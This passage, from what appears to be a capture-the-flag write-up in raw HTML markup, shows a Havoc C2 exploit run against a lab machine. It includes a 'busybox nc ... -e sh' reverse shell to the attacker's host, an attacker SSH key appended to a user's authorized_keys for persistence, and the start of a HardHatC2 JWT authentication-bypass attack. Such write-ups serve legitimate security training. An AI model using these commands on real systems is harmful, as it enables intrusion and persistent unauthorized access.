+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">11
+&lt;/span>&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">python3&lt;/span> &lt;span class="nx">CVE&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2024&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">41570.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">t&lt;/span> &lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//10.10.11.49 -i 127.0.0.1 -p 40056 -U ilya -P &amp;#39;CobaltStr1keSuckz!&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">register&lt;/span> &lt;span class="nx">agent&lt;/span>&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">teamserver&lt;/span>&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">write&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">socket&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">poll&lt;/span> &lt;span class="nx">teamserver&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span>&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Read&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span> &lt;span class="nx">successfully&lt;/span>&lt;span class="p">!&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">Enter&lt;/span> &lt;span class="nx">command&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">execute&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">busybox&lt;/span> &lt;span class="nx">nc&lt;/span> &lt;span class="mf">10.10.14.173&lt;/span> &lt;span class="mi">80&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">e&lt;/span> &lt;span class="nx">sh&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">write&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">socket&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">poll&lt;/span> &lt;span class="nx">teamserver&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span>&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Read&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span> &lt;span class="nx">successfully&lt;/span>&lt;span class="p">!&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>As the reverse shell was unstable and kept disconnecting, we add our public SSH key to Ilya’s SSH authorized_keys file for a more stable access.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
+&lt;/span>&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">lvnp&lt;/span> &lt;span class="mi">80&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">listening&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="kt">any&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="mi">80&lt;/span> &lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">connect&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mf">10.10.14.173&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nf">from&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">UNKNOWN&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="mi">60884&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">echo&lt;/span> &lt;span class="s">&amp;#34;ssh-ed25519 A...k kali@kali&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ilya&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">authorized_keys&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ilya&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">authorized_keys&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ed25519&lt;/span> &lt;span class="nx">A&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="nx">k&lt;/span> &lt;span class="nx">kali&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>Then, we can access the server via SSH and grab the user flag.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">3
+&lt;/span>&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
+&lt;/span>&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="p">~&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">id_ed25519&lt;/span> &lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">files&lt;/span> &lt;span class="nx">hardhat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">b96&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="mo">016&lt;/span>&lt;span class="nx">b&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h2 id="lateral-mouvement-sergej">Lateral mouvement: Sergej
+&lt;/h2>&lt;h3 id="exploit-hardhat-c2-authentification-bypass--rce">Exploit HardHat C2: Authentification bypass + RCE
+&lt;/h3>&lt;p>Inside &lt;code>Ilya&lt;/code>’s home directory, there is a file called &lt;code>hardhat.txt&lt;/code> containing the following content:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">3
+&lt;/span>&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">files&lt;/span> &lt;span class="nx">hardhat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">hardhat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Sergej&lt;/span> &lt;span class="nx">said&lt;/span> &lt;span class="nx">he&lt;/span> &lt;span class="nx">installed&lt;/span> &lt;span class="nx">HardHatC2&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">testing&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">not&lt;/span> &lt;span class="nx">made&lt;/span> &lt;span class="kt">any&lt;/span> &lt;span class="nx">changes&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">defaults&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">I&lt;/span> &lt;span class="nx">hope&lt;/span> &lt;span class="nx">he&lt;/span> &lt;span class="nx">prefers&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">bcoz&lt;/span> &lt;span class="nx">I&lt;/span> &lt;span class="nx">don&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">t&lt;/span> &lt;span class="nx">wanna&lt;/span> &lt;span class="nx">learn&lt;/span> &lt;span class="nx">another&lt;/span> &lt;span class="nx">C2&lt;/span> &lt;span class="nx">framework&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">also&lt;/span> &lt;span class="nx">Go&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">C&lt;/span>&lt;span class="err">#&lt;/span> &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>Checking the open ports confirms that a &lt;code>HardHat&lt;/code> instance, another command and control server, is running on the machine:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 4
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 5
+&lt;/span>&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">netstat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">planetu&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">..&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Proto&lt;/span> &lt;span class="nx">Recv&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Q&lt;/span> &lt;span class="nx">Send&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Q&lt;/span> &lt;span class="nx">Local&lt;/span> &lt;span class="nx">Address&lt;/span> &lt;span class="nx">Foreign&lt;/span> &lt;span class="nx">Address&lt;/span> &lt;span class="nx">State&lt;/span> &lt;span class="nx">User&lt;/span> &lt;span class="nx">Inode&lt;/span> &lt;span class="nx">PID&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Program&lt;/span> &lt;span class="nx">name&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5000&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1001&lt;/span> &lt;span class="mi">50679&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7096&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1001&lt;/span> &lt;span class="mi">51911&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">40056&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">54307&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">443&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">21679&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">22&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">22673&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8000&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">21680&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8443&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">53569&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">55332&lt;/span> &lt;span class="mf">10.10.14.156&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">80&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">54389&lt;/span> &lt;span class="mi">4854&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sh&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">40056&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">35702&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">53582&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">35702&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">40056&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">1000&lt;/span> &lt;span class="mi">54337&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">272&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">22&lt;/span> &lt;span class="mf">10.10.14.156&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">36602&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">53621&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tcp6&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">:::&lt;/span>&lt;span class="mi">22&lt;/span> &lt;span class="p">:::&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">LISTEN&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">22684&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">udp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">68&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">15357&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">udp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">43747&lt;/span> &lt;span class="mf">8.8.8.8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">997&lt;/span> &lt;span class="mi">54599&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">udp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">58233&lt;/span> &lt;span class="mf">8.8.8.8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">1001&lt;/span> &lt;span class="mi">53738&lt;/span> &lt;span class="o">-&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">udp&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">44241&lt;/span> &lt;span class="mf">8.8.8.8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span> &lt;span class="nx">ESTABLISHED&lt;/span> &lt;span class="mi">1001&lt;/span> &lt;span class="mi">54632&lt;/span> &lt;span class="o">-&lt;/span> &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>Since &lt;code>Sergej&lt;/code> made no changes to the default configuration of the C2, we will rely on the following article to compromise his account:
+&lt;a class="link" href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7" target="_blank" rel="noopener"
+>https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7&lt;/a>&lt;/p>
+&lt;p>More specifically, we focus on vulnerabilities 2 and 3.&lt;/p>
+&lt;p>The first vulnerability, an authentication bypass, exploits the fact that HardHat uses a static key to sign JWTs, which here allows us to create authentication tokens for any role.&lt;/p>
+&lt;p>We then forward the port 5000 to use the script from the article and create a new user with the role of &lt;code>TeamLead&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
